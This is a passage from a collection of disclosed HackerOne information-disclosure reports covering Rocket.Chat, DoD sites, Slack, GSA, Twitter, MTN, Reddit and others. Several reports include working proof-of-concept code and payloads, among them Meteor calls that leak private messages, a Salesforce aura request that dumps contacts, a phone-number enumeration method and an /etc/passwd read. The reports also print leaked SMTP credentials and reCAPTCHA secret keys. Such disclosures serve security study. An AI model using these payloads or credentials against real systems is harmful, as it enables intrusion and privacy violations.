  4. Query `/api/v1/chat.getThreadsList?rid[$regex]=GENERAL|${TARGET_ROOM_ID}`

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

## Suggested mitigation

  * Strictly verify input parameter type.
  * Use the ROOM ID returned for ACL verification in the final query.

## Impact

Authenticated users can leak thread messages from private rooms they should not have access to.

## Fix

Fixed in version 5.0>

---

### [getUserMentionsByChannel leaks messages with mention from private channel](https://hackerone.com/reports/1410246)

- **Report ID:** `1410246`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2022-09-22T16:01:13.414Z
- **CVE(s):** CVE-2022-35249, CVE-2022-32220

**Summary (team):**

## Summary

The `getUserMentionsByChannel` meteor server method discloses messages from private channels and direct messages regardless of the users access permission to the room.

## Description

When calling the `getUserMentionsByChannel` method, the server does not check the users access to the given room and returns all messages the user has been mentioned in.

```javascript
Meteor.call(
  "getUserMentionsByChannel",
  { roomId: "<TARGET_ROOM>" },
  console.log
);
```

The issue was found in [app/mentions/server/methods/getUserMentionsByChannel.js#L7-L23](https://github.com/RocketChat/Rocket.Chat/blob/194a600f31a1037716ac4de297cfff0b8a4f9942/app/mentions/server/methods/getUserMentionsByChannel.js#L7-L23) where roomId is verified to be a String only.

```javascript
Meteor.methods({
	getUserMentionsByChannel({ roomId, options }) {
		check(roomId, String);

		if (!Meteor.userId()) {
			throw new Meteor.Error('error-invalid-user', 'Invalid user', { method: 'getUserMentionsByChannel' });
		}

		const room = Rooms.findOneById(roomId);

		if (!room) {
			throw new Meteor.Error('error-invalid-room', 'Invalid room', { method: 'getUserMentionsByChannel' });
		}

		const user = Users.findOneById(Meteor.userId());

		return Messages.findVisibleByMentionAndRoomId(user.username, roomId, options).fetch();
	},
});
```

The server will return all messages the requesting user has been @ mentioned in.

## Releases Affected:

  * `4.1.2`
  * `3.18.3`
  * First [99065f7518bc88341210c0e38678bc3c97e3b58a](https://github.com/RocketChat/Rocket.Chat/blob/99065f7518bc88341210c0e38678bc3c97e3b58a/packages/rocketchat-mentions/server/methods/getUserMentionsByChannel.js) (12.03.2018)

## Steps To Reproduce (from initial installation to vulnerability):

1. Login to Rocket.Chat
2. Obtain Room Id
   1. Guess Direct Message roomId from User IDs
   2. Leak private Message ID with unknown vulnerability
3. Call `getUserMentionsByChannel` with given `{ roomId: "<Value>" }`
4. Read messages where the own user was mentioned in console.log output

## Supporting Material/References:

The following example leks a private message between two users to a third account `trudy` who performs the requests from the authenticated client disclosing a direct message between `alice` and `bob`.

```javascript
Meteor.user().username
// > 'trudy'
let alice = 'kYfzDMQLyPFjS9ASb';
let bob = 'zZnrfd2RvcWhspr6S';
Meteor.call(
  "getUserMentionsByChannel",
  { roomId: `${alice}${bob} }, // direct message channel
  (err, data) => console.log(
  	data
  	  .map((m) => `${m._id} ${m.u.username} (${m.ts.toGMTString()}): ${m.msg}`)
  	  .join("\n")
  )
);
// > Yp6NoMZk34mnQZiBR alice (Thu, 25 Nov 2021 14:17:25 UTC): Mention @trudy somewhere

Meteor.call("getMessages", ["Yp6NoMZk34mnQZiBR"], (err, data) => console.log(err.message))
// > Not allowed [error-not-allowed]
```

## Suggested mitigation

  * Check for permission to read messages from the room given in in `{ roomId }` method argument.

## Impact

Authenticated users can disclose all messages they were mentioned in from private channels and direct messages they should not have access to.


## Fixed in

We have fix this issue in version 5.0>

---

### [springboot actuator is leaking internals at ██████████](https://hackerone.com/reports/1662474)

- **Report ID:** `1662474`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @thpless
- **Bounty:** - usd
- **Disclosed:** 2022-09-14T20:29:17.123Z
- **CVE(s):** -

**Vulnerability Information:**

### Proof of Concept

If you go to https://█████████/actuator you'll get a complete overview of all the endpoints that are accessable 
(Suggestion: Use a Firefox Browser if possible, its json representation is well formed and the links are clickable )

██████████

## Impact

Information Disclosure 

* https://████/actuator/beans
Displays a complete list of all the Spring beans in your application.

* https://██████████/actuator/caches
Exposes available caches. For ███ it is empty

* https://███████/actuator/health
The actual status of the actuator is displayed
```
status	"UP"
components	
diskSpace	
status	"UP"
details	
total	1167859712
free	1167810560
threshold	10485760
exists	true
ping	
status	"UP"
```

* https://███/actuator/info
version and  built time are displayed
```	
build	
version	"1.2.1-SNAPSHOT"
artifact	"unregister-file-endpoint"
name	"UnregisterFileEndpoint"
group	"com.hexusfed"
time	"2022-06-30T14:44:23.879Z"
```

* https://██████████/actuator/conditions
Shows the conditions that were evaluated on configuration and auto-configuration classes and the reasons why they did or did not match.

* https://█████/actuator/configprops
Displays a collated list of all configuration properties.

* https://█████/actuator/env
contains internal paths, ports, version numbers etc.

* https://███/actuator/loggers
configuration of loggers in the application

* https://███/actuator/heapdump *** (CRITICAL)***
Downloads a complete  heap dump file (about 30 MBs). This file has a  PHD-format and can be analyzed with a heapdump analyzer tool.

* https://█████████/actuator/threaddump
Performs a thread dump.

* https://████████/actuator/metrics
internal metrics

* https://█████/actuator/scheduledtasks
For this system there are no scheduled tasks running

* https://█████/actuator/mappings
Displays a collated list of all request paths (mapped to the coresponding internal software module).

## System Host(s)
████

## Affected Product(s) and Version(s)
spring-boot.actuator.v3

## CVE Numbers


## Steps to Reproduce
If you use the link https://███████/actuator, you'll see all the leaked endpoints in a json file

## Suggested Mitigation/Remediation Actions
By default, all endpoints except for shutdown are enabled. To configure the enablement of an endpoint, use its management.endpoint.<id>.enabled property.

Normally /actuator/health and /actuator/info are enabled the rest is disabled .

---

### [The dashboard is exposed in https://███](https://hackerone.com/reports/1566758)

- **Report ID:** `1566758`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alitoni224
- **Bounty:** - usd
- **Disclosed:** 2022-09-06T18:53:22.564Z
- **CVE(s):** CVE-2020-7130

**Vulnerability Information:**

**Description:**
At first, hello, after searching in sub-domains, the dashboard was accessed by Google Dorking Which is supposed to be protected
https://█████████l/arsys/forms/arpcp/ARPC%3AWeb%3AHier%3ADashboard/Default+Admin+View/?F536871388=1&mode=Submit&cacheid=c66791da

## References
https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure

## Impact

CWE-200
https://cwe.mitre.org/data/definitions/200.html

## System Host(s)
█████████l

## Affected Product(s) and Version(s)
website

## CVE Numbers
CVE-2020-7130

## Steps to Reproduce
After searching in Google dorking on a file extension or endpoint jspDashboard found in the URL
https://████████l/arsys/forms/arpcp/ARPC%3AWeb%3AHier%3ADashboard/Default+Admin+View/?F536871388=1&mode=Submit&cacheid=c66791da 
██████

==Note==
 that it is leaked, you can log out and bypass it by typing anything in the ```username``` box

## Suggested Mitigation/Remediation Actions
Collect sensitive information on a local server and protect endpoints


---------------------------------------
With best regards and love
Toni...

---

### [SSRF via Office file thumbnails](https://hackerone.com/reports/671935)

- **Report ID:** `671935`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Slack
- **Reporter:** @ziot
- **Bounty:** 4000 usd
- **Disclosed:** 2022-07-05T18:40:05.873Z
- **CVE(s):** -

**Summary (team):**

On August 12, 2019, a group of researchers reported an exploit path for a vulnerability in LibreOffice. Slack uses LibreOffice to process certain file types for preview. A specially crafted file uploaded to Slack could permit local file access and expose an internal Slack AWS credential for the container used to process these files. This was categorized as Critical, in our internal rubric, which is aligned with CVSSv3.

We fixed the bug on August 13th, 2019. Following a thorough investigation, Slack concluded the this vulnerability was not exploited except by the security researcher who reported this issue, and that this researcher did not gain access customer data.

The vulnerability and fix to LibreOffice and the unoconv library was later documented in [CVE-2019-17400](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17400).

Slack would like to thank researchers @ziot, @daeken, @smiegles, and @erbbysam for their report.

---

### [API docs expose an active token for the sample domain theburritobot.com](https://hackerone.com/reports/1507412)

- **Report ID:** `1507412`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @sainaen
- **Bounty:** 500 usd
- **Disclosed:** 2022-06-27T16:23:17.043Z
- **CVE(s):** -

**Summary (team):**

A screenshot featured on [API token creation](https://developers.cloudflare.com/api/tokens/create/#generating-the-token) documentation page exposed a valid API token with permissions sufficient to modify DNS records of one of Cloudflare’s demo zones.
The token has since been revoked.

---

### [Registered users contact  information disclosure on salesforce lightning endpoint https://disposal.gsa.gov](https://hackerone.com/reports/1443654)

- **Report ID:** `1443654`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. General Services Administration
- **Reporter:** @rptl
- **Bounty:** - usd
- **Disclosed:** 2022-06-06T06:17:37.854Z
- **CVE(s):** -

**Vulnerability Information:**

Hi, 

Sample of the Information Disclosure is below.  More records are attached -███

"LastName":"████","FullName__c":"█████████","Id":"██████████","MailingStreet":null,"Active__c":false,"Email__c":null,"LastModifiedBy":{"Id":"00530000009KyDqAAK","Name":"SNA █████████","sobjectType":"User"},"UserPassword__c":null,"Office__c":null,"BIA_Coordinator__c":false,"Contact_Type__c":null,"MailingCountry":null,"Salutation":null,"MailingState":null,"OwnerId":"005t0000002H5O6AAK","RecordType":{"Name__l":"Non-Federal Contact","Id":"████","Name":"Non-Federal Contact","sobjectType":"RecordType"},"Phone":"███"

User","sobjectType":"User"},"AccountId":"█████████","Email":"█████","Subscription_Type__c":null,"THPO_Coordinator__c":false,"MobilePhone":null,"Do_Not_Call__c":false,**Name":"█████████**,"Region__c":null,"LastModifiedDate__f":"5/12/2019 8:49 AM","CreatedById":"005t0000001FpB7AAK","Subscriber__c":false,"State__c":null,"CreatedBy":{"Id":"005t0000001FpB7AAK","Name":"Property Disposal Site Guest User","sobjectType":"User"},"Section_7_Coordinator__c":false,"Environmental_Assessor__c":false,"MailingCity":null,"Salutation__l":null,"CreatedDate__f":"1/24/2018 1:22 AM","Comments__c":null,"CreatedDate":"2018-01-24T06:22:57.000Z","Division__c":null,"LastName":"████","FullName__c":"████"


## Steps to Reproduce -

1) Create user account on https://disposal.gsa.gov

2) Complete to account verification process.

3) After login, visit the burp history and look for any any POST request having "/s/sfsites/aura" kind of request.

4) Use the POST request like this █████ in repeater and modify "message" parameter as below and leave remaining aura.context and aura.token parameters as it is.

message={"actions":[{"id":"261;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","pageSize":1000,"currentPage":1,"getCount":true,"layoutType":"FULL","enableRowActions":true,"useTimeout":false}}]}

5) contact details of users will be returned by the endpoint.

## Impact

Information disclosure.

---

### [Enumerate class codes via yahoo dork - Can access any course under teacher - Sensitive information leaked](https://hackerone.com/reports/1514356)

- **Report ID:** `1514356`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Khan Academy
- **Reporter:** @bughunterpol
- **Bounty:** - usd
- **Disclosed:** 2022-05-01T18:05:32.828Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team,
I am quality researcher and I found some links using yahoo dorking techniques
I used yahoo dork `site:pl.khanacademy.org/join` 
I used Firefox browser.

Steps to reproduce:
1.Go to yahoo search page and use above query to enumerate.
2.Create student account by filling all the required details
3.Now you are in the class without actually invited by teacher.
4.You can pick any course from item and start you course.

I can also able to see teacher Full name- This is sensitive information 

Attached POC:

## Impact

Any black hacker can enumerate all the classes and join in them and can make chaos.
Some chances of IDOR too.
If you can encrypt this class details which some hashing technique and this will not showed up with dorking queries.

---

### [Workspace configuration metadata disclosure](https://hackerone.com/reports/864489)

- **Report ID:** `864489`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Slack
- **Reporter:** @kadusantiago
- **Bounty:** - usd
- **Disclosed:** 2022-04-01T19:44:56.186Z
- **CVE(s):** -

**Summary (team):**

Slack allows users to create a Workspace using the Get Started page, located at https://slack.com/get-started#/create. This process uses workspace metadata to direct the user-provided email address to existing Slack accounts. However, if a domain pertaining to an Enterprise customer is submitted during the Workspace creation process, the response from the Slack API will contain data about the Organization, such as its SSO provider, Enterprise ID, and the email address which the Organization uses to manage their Slack account. This allows an attacker to obtain metadata about Slack's Enterprise customers, by supplying the Organization’s email domain to the Workspace creation form.

---

### [Identify the mobile number of a twitter user](https://hackerone.com/reports/1225164)

- **Report ID:** `1225164`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** X / xAI
- **Reporter:** @aymen_mansour
- **Bounty:** 560 usd
- **Disclosed:** 2022-03-29T18:39:24.848Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
By exploiting this security vulnerability we can detect the mobile number of a twitter user.


**Description:**
This security vulnerability is of type "Information disclosure" it allows to exploit Flawed behavior of the twitter system to obtain distinct responses when different error states occur.
This security vulnerability allows to identify the mobile number of a twitter user from its USER_NAME.

## Steps To Reproduce:

We explain how to get the mobile number which is (██████████) from the following twitter user "███"==> USER_NAME = ████

1.access the following url: "████" and enter user name "██████" and click search. (see screenshot "1.PNG")
2. At this step twitter  displays the last 2 digits of mobile number through this message "text a code to the phone number ending in 15", the last two digits are 15, click on next.(see screenshot "2.PNG")
3. repeat step number 2 several times, i.e. repeat asking to receive the code several times until you get the following message: "You've exceeded the number of attempts. Please try again later."(see screenshot "3.PNG")
4.Now twitter  block sends it sms code to the number associated with the victim's twitter  account which ends with two digits 15

====> twitter  block sends it again sms for the correct victim mobile number, ie "████████" but it does not block it sends sms to any other different mobile number at ███ (the probability that twitter block sends an sms to mobile number different to █████████ which ends in 15 and has the following format &&&&&&15 at the time of launching the attack is 0.000001% ) so we can use the "Forgot Password" feature and ask to receive an sms on all the following format numbers &&&&&&15 and the attempt which returns the following message: "You've exceeded the number of attempts. Please try again later."is an attempt associated with the victim mobile number.

==> an attempt to receive an SMS code at the mobile number of the following format: &&&&&&15 may return 3 different messages:
1st message : Number not associated with a twitter  account
2nd message : "You'll recive a code to verify here so you can reset your accont password." ==> this is not the victim mobile number .(see screenshot "7.PNG" and "8.PNG" )
3rd message: "You've exceeded the number of attempts. Please try again later". ==> this is the victim mobile number (see screenshot "4.PNG" and "5.PNG" and "6.PNG"  )


5. to identify the mobile number we will access this url "████████" and try to request sms code on all the mobile numbers that end by 15 which follows this format &&&&&&15 that is to say make a brute force on all the number which ends in 15, therefore the request which tries to recive sms code associating with the correct victim number account will display the following message: "You've exceeded the number of attempts. Please try again later" on the other side any other request that is not associated with victim's correct mobile number will display the following message: "You'll recive a code to verify here so you can reset your accont password." or a number not associated with a twitter account.


===>we can deduce the number of victim's digit according to the user's country or we can easily deduce it, the victim's country is "██████" so the format of its number is as follows: &&&&&&15, To accelerate the brute force and decipher the correct digits more quickly associated with this number &&&&&&15 we will use the following information:
the mobile number for the ████ region begins with the following operator phone code: (26-27) (56-57)
, so we are now going to brute force on this number range:
26&&&&15 ... 27 &&&&15
56&&&&15 ... 57&&&&15

we have 10 ^ 4 = 10000 mobile number to test each time to identify the correct victim mobile number, we eliminate the numbers that are not associated with a twitter account then determine which number blocked by twitter from receiving sms that returns the message next: "You've exceeded the number of attempts. Please try again later" , this is the victim mobile number.

## Impact: [add why this issue matters]
This issue has a critical impact on user privacy

## Impact

Attacker has a critical impact on the confidentiality  of the twitter user

---

### [Insecure crossdomain.xml on https://vdc.mtnonline.com/](https://hackerone.com/reports/838817)

- **Report ID:** `838817`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** MTN Group
- **Reporter:** @xlife
- **Bounty:** - usd
- **Disclosed:** 2022-03-20T05:31:53.400Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

https://vdc.mtnonline.com/crossdomain.xml contains the following xml file:

```

<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
	<cross-domain-policy>    
	<site-control permitted-cross-domain-policies="all"/>    
	<allow-access-from domain="*"  secure="false" to-ports="*"/>
	<allow-http-request-headers-from domain="*" headers="*"/> 
	</cross-domain-policy>

```

## Impact

This will make any one able to receive content from https://vdc.mtnonline.com/ , attacker can steal CSRF tokens and user PII.

More information about this issue is available here:

https://medium.com/@x41x41x41/exploiting-crossdomain-xml-missconfigurations-3c8d407d05a8

Best regards,
Vishu10x00 ❤️

---

### [PHP Info Exposing Secrets at https://radio.mtn.bj/info](https://hackerone.com/reports/1049402)

- **Report ID:** `1049402`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** MTN Group
- **Reporter:** @pudsec
- **Bounty:** - usd
- **Disclosed:** 2022-03-08T10:48:49.462Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
During recon I discovered a PHP Info file exposing environment variables such as; Laravel APP_KEY, Database username/password, SMTP username/password, etc.

## Steps To Reproduce:
Visit the following URL;
```
https://radio.mtn.bj/info
```
You will be presented with a PHP Info file exposing environment / PHP Variables.

## Further Information:
I successfully sent an email using [python-smtp-mail-sending-tester](https://github.com/turbodog/python-smtp-mail-sending-tester) with the exposed credentials;
```
$ python smtptest.py -v -u eba@gbdesignweb.com -p w?#h#DLkAPa7 no-reply@mtn.bj pudsec@wearehackerone.com camembert.o2switch.net
('usetls:', False)
('usessl:', False)
('from address:', 'no-reply@mtn.bj')
('to address:', 'pudsec@wearehackerone.com')
('server address:', 'camembert.o2switch.net')
('server port:', 25)
('smtp username:', 'eba@gbdesignweb.com')
smtp password: *****
('smtplib debuglevel:', 0)
-- Message body ---------------------
From: no-reply@mtn.bj
To: pudsec@wearehackerone.com
Subject: Test Message from smtptest at 2020-12-03 13:02:56

Test message from the smtptest tool sent at 2020-12-03 13:02:56
-------------------------------------
```

The [APP_KEY](https://divinglaravel.com/app_key-is-a-secret-heres-what-its-used-for-how-you-can-rotate-it) being exposed can potential be abused as it's primary purpose is for encrypting cookies, creating signatures and encrypting/decrypting values.

## Suggestions:
* Never expose PHP Info
* Change all passwords and APP_KEY

## Impact

Exposing passwords to critical services.
Providing application keys used for encryption/decryption within the app.
Sending email coming from an official email address.

---

### [default ████ creds on https://████████](https://hackerone.com/reports/711662)

- **Report ID:** `711662`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @pirateducky
- **Bounty:** - usd
- **Disclosed:** 2022-02-14T21:17:10.802Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

I can log into `https://███ using` `█████` as credentials

## Impact
Can do anything an ██████████ can do in this application, Server Now 

## Step-by-step Reproduction Instructions

1. go to `https://███████`
2. log in using `██████████`

## Suggested Mitigation/Remediation Actions

use proper authentication, this might be a test account but it should still not use `███` as the creds

## Impact

logged in as ████ ██████ as shown in the screenshot

---

### [Information disclosure-Referer leak](https://hackerone.com/reports/1337624)

- **Report ID:** `1337624`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Brave Software
- **Reporter:** @kkarfalcon
- **Bounty:** 500 usd
- **Disclosed:** 2022-02-01T19:32:16.611Z
- **CVE(s):** -

**Vulnerability Information:**

Assigned to: Brave
Assigned by: Kirtikumar Anandrao Ramchandani
Assigned on: 13/09/2021
Browser information used to test (Up to date):
```
Brave	1.29.79 Chromium: 93.0.4577.63 (Official Build) (64-bit)
Revision	ff5c0da2ec0adeaed5550e6c7e98417dac77d98a-refs/branch-heads/4577@{#1135}
OS	Windows 10 OS Version 2009 (Build 19043.1165)
```

Vulnerability name: Information Disclosure
Vulnerability description: Brave browser has a function of    `New Private Window with Tor`. The browser when used with Tor shouldn't leak the referer.
Steps to reproduce:
1. Visit [exploit].
2. Click on `https://www.whatismybrowser.com/`.

Expected behavior: It should have shown a blank `referrer`
Actual behavior: It shows the referrer as: `kirtikumarar.com` which was the host from where we navigated

To know expected behavior, please refer to the below screenshot:
{F1445735}

Video POC showing the expected behavior can be found below:

{F1445736}

[exploit]: https://kirtikumarar.com/referrer/top-page.html

## Impact

1. This will leak users information
2. In the Tor network, we don't have common URLs as we have in the browsers. They usually are something like `dhxnafkaxlxdnackeudxdca.onion`, those can be leaked.

---

### [The Return of the Grinch](https://hackerone.com/reports/1433581)

- **Report ID:** `1433581`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** h1-ctf
- **Reporter:** @w31rd0
- **Bounty:** - usd
- **Disclosed:** 2022-02-01T17:44:10.963Z
- **CVE(s):** -

**Summary (team):**

Read the full writeup here: https://github.com/tarifas90/CTF-Writeups-2021/blob/main/hackyholidasy2021.md

---

### [Wrong settings in ADF Faces leads to information disclosure](https://hackerone.com/reports/1422641)

- **Report ID:** `1422641`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @h3xr
- **Bounty:** - usd
- **Disclosed:** 2022-01-19T19:28:18.141Z
- **CVE(s):** -

**Vulnerability Information:**

Hello, Team.

Found some interesting links which leads to information disclosure in █████
Link 1: [██████████]███
Link 2: [████████]██████████
Link 3: [██████████]███

Every link goes through https://██████to https://████
**For Link 3 is possible to change data in the fields: First Name, Last Name, Phone Number. Just click "██████".**

Viewing the code gives us some more info about the system:
```
██████
```

ADF ███████ is outdated
The [Ref. Page](https://docs.oracle.com/cd/E41362_01/web.1111/b31973/ap_config.htm) says:
*A.2.3.16 Version Number Information
Use the oracle.adf.view.rich.versionString.HIDDEN parameter to determine whether or not to display version information an a page's HTML. When the parameter is set to false, the HTML of an ADF Faces page contains information about the version of ADF Faces and other components used to create the page as shown in Example A-2.
When you create a new application, the parameter is set to true. It should also be set to true in a production environment. Set the parameter to false to display this version information for debugging information.
Note:
In a production environment, set this parameter to true to avoid security issues. It should be set to false only in a development environment for debugging purposes.*

[This Ref.](https://imlive.s3.amazonaws.com/Federal%20Government/ID188660931371312277217448460962608356160/Attachment_E_███S_Request_for_Role_Guide.pdf) points us that Link 3 is:
*██████S lists any █████s waiting for your approval. If there are none, there will be a message like the one in ███████. Click the Logout button to exit ██████████S.  You can use the link in your email to return to the ██████████.*

But we see the Logout button and can modify some data - so **perhaps** we are logged in.

## Impact

Sensitive information disclosure
Information modification
Privacy Violation

## System Host(s)
███████

## Affected Product(s) and Version(s)
Oracle ADF Faces

## CVE Numbers


## Steps to Reproduce
In the Desc. section

## Suggested Mitigation/Remediation Actions
Update Oracle ADF
Close sensitive information from unauthenticated users

---

### [Просмотр закрытых фотографий](https://hackerone.com/reports/584582)

- **Report ID:** `584582`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2021-12-15T13:28:11.500Z
- **CVE(s):** -

**Summary (team):**

Недостаточная валидация запросов.

---

### [Endpoint without access control leads to order informations and status changes](https://hackerone.com/reports/1050753)

- **Report ID:** `1050753`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Azbuka Vkusa
- **Reporter:** @cabelo
- **Bounty:** - usd
- **Disclosed:** 2021-12-09T21:35:18.436Z
- **CVE(s):** -

**Summary (team):**

Closed.

---

### [Recaptcha Secret key Leaked](https://hackerone.com/reports/1416665)

- **Report ID:** `1416665`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Paragon Initiative Enterprises
- **Reporter:** @aif_lill
- **Bounty:** - usd
- **Disclosed:** 2021-12-04T18:07:14.326Z
- **CVE(s):** -

**Vulnerability Information:**

Greeting from @kashifinfo90,

I hope **Paragonie Security Team** is doing great, Following **Secret Keys** are leaked:
> "secret-key": "6Ldy5BYTAAAAAPBh868BMm2nGZelOUyXJHTUE4no",
   "site-key": "6Ldy5BYTAAAAACk3Tj8wDUBLcVxSL2JXFBw-Dtj3"
  "secret-key": "6Ld27iETAAAAAF6tsd5SaoCgc5cFX-tkfHqx7FtX",
  "site-key": "6Ld27iETAAAAAI51EVcu0nBw2wkxQiZxg1zGv2uI"

##Steps To Reproduce:
To find the leak please [Click Here](https://github.com/paragonie/airship/commit/037c03db5621409103f45b2f6dc6da8ae8f12ee6#diff-2f87b6e210a2b88cc43a283065ab08a53ead3159288cb52b94a17509b7ece910)

## Impact

To avoid any legal issue i didn't try anything with these key, hence it up to you to fully investigate them and figure out if they have any security impact.
Note: If it is out of scope or your figure out that the security impact is un considerable please  allow me to selfclose it, It will prevent decrease in my current reputation points.

kind Regards,
@kashifinfo90.

---

### [Corporate Jira credentials disclosed in public gist](https://hackerone.com/reports/958432)

- **Report ID:** `958432`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Azbuka Vkusa
- **Reporter:** @mkhazov
- **Bounty:** - usd
- **Disclosed:** 2021-11-15T17:29:58.300Z
- **CVE(s):** -

**Summary (team):**

Closed.

---

### [critical file found etc/passwd on www.reddit.com](https://hackerone.com/reports/1187003)

- **Report ID:** `1187003`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Reddit
- **Reporter:** @himan253
- **Bounty:** - usd
- **Disclosed:** 2021-10-21T19:54:55.412Z
- **CVE(s):** -

**Vulnerability Information:**

1.go to this link https://www.reddit.com/etc%2fpasswd
2.youll find all the etc/passwd   files this data should be protected.
3.these passwd can be used for many illegal purpose and can damage the comapny 
poc attched:
HTTP/2 200 OK
Content-Type: text/plain; charset=UTF-8
X-Ua-Compatible: IE=edge
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Cache-Control: max-age=0, must-revalidate
X-Moose: majestic
Accept-Ranges: bytes
Date: Thu, 06 May 2021 19:04:28 GMT
Via: 1.1 varnish
Vary: accept-encoding
Set-Cookie: loid=0000000000bz6qw076.2.1620327868031.Z0FBQUFBQmdsRDI4Q1NBY21wZmZ6MGlydUE3SllQbkRzNzR4UDVGMkI2QjVjWHVJR05aOFVrY1RvS3Fmdm40aDlvMXM0VzdGWkdFaEZDaTdNcUZwOVBlX294VWJuY1lxb0R5Uzdxa2ZxQ21Ra0lkaXZvb1BoYWNJUmpGRVNVTUNUSlpmbmVLYV9RUkM; Domain=reddit.com; Max-Age=63071999; Path=/; expires=Sat, 06-May-2023 19:04:28 GMT; secure; SameSite=None; Secure
Set-Cookie: session_tracker=dAuhcStLE0ABOIbbQG.0.1620327868031.Z0FBQUFBQmdsRDI4MUJpdTFveEM5RzFONlpmQVBNRTFrUU9EZTExODF3MzUwZjIxNGNiODBUaWYtQW1pakNCZFA2eWhWcEVHbmh0N1dlTVNFdEE0NkhPbmdMOE54YjRQeUp4T1ZUc1JmRlVfMER2VzhoTFd4amlzQWlldkZqcG9uVzBKSkR4cTB6LVM; Domain=reddit.com; Max-Age=7199; Path=/; expires=Thu, 06-May-2021 21:04:28 GMT; secure; SameSite=None; Secure
Set-Cookie: csv=1; Max-Age=63072000; Domain=.reddit.com; Path=/; Secure; SameSite=None
Set-Cookie: edgebucket=JJxiXzjqsnVU7EAuE7; Domain=reddit.com; Max-Age=63071999; Path=/;  secure
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
Server: snooserv
Content-Length: 1523

root:*:16583:0:99999:7:::
daemon:*:16583:0:99999:7:::
bin:*:16583:0:99999:7:::
sys:*:16583:0:99999:7:::
sync:*:16583:0:99999:7:::
games:*:16583:0:99999:7:::
man:*:16583:0:99999:7:::
lp:*:16583:0:99999:7:::
mail:*:16583:0:99999:7:::
news:*:16583:0:99999:7:::
uucp:*:16583:0:99999:7:::
proxy:*:16583:0:99999:7:::
www-data:*:16583:0:99999:7:::
backup:*:16583:0:99999:7:::
list:*:16583:0:99999:7:::
irc:*:16583:0:99999:7:::
gnats:*:16583:0:99999:7:::
nobody:*:16583:0:99999:7:::
libuuid:!:16583:0:99999:7:::
syslog:*:16583:0:99999:7:::
messagebus:*:16583:0:99999:7:::
landscape:*:16583:0:99999:7:::
sshd:*:16583:0:99999:7:::
pollinate:*:16583:0:99999:7:::
puppet:*:16584:0:99999:7:::
memcache:!:16727:0:99999:7:::
ntp:*:16727:0:99999:7:::
snmp:*:16727:0:99999:7:::
spez:$1$$GbK4WZMpXZgmYlQ+H3/68Q==:16727:0:99999:7:::
daniel:$1$$X03MO1qnZdYdgyfeuILPmQ==:16727:0:99999:7:::
spladug:$1$$Xee7PCMnQfRh88zRPBunoA==:16727:0:99999:7:::
neil:$1$$KrljkMfb40Od500MmwsXZw==:16727:0:99999:7:::
neal:$1$$Xr4ilOzQ4PCOq3aQ0qbuaQ==:16727:0:99999:7:::
sam:$1$$BtgOsMULSaUJtJ8kJOjIBQ==:16727:0:99999:7:::
neel:$1$$0HfyRN74pw5ep1i9g1L82A==:16727:0:99999:7:::
kneel:$1$$g+Spau2WQ2xiG5gJ4lizCQ==:16727:0:99999:7:::
kevin:$1$$yOjfiVwsrhZrrQJ/3xUzWw==:16727:0:99999:7:::
kavin:$1$$31PKJoJAynZnDIVm7lRWig==:16727:0:99999:7:::
kovin:$1$$G43Qgw1Fk6OIrzganMC2WA==:16727:0:99999:7:::
powerlanguage:$1$$A9kE9Zud+aPy76hqmMj3lQ==:16727:0:99999:7:::
robin:$1$$q67PjKP5jcE+7susJjzT7Q==:16727:0:99999:7:::
justin:$1$$zRTDI5AgJOcshQqoKNY0pw==:16727:0:99999:7:::

## Impact

all the password and data publicly available

---

### [Tor Browser using --log or --verbose logs the exact connection time a client connects to any v2 domains.](https://hackerone.com/reports/1250273)

- **Report ID:** `1250273`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Tor
- **Reporter:** @sickcodes
- **Bounty:** - usd
- **Disclosed:** 2021-09-27T09:14:58.374Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
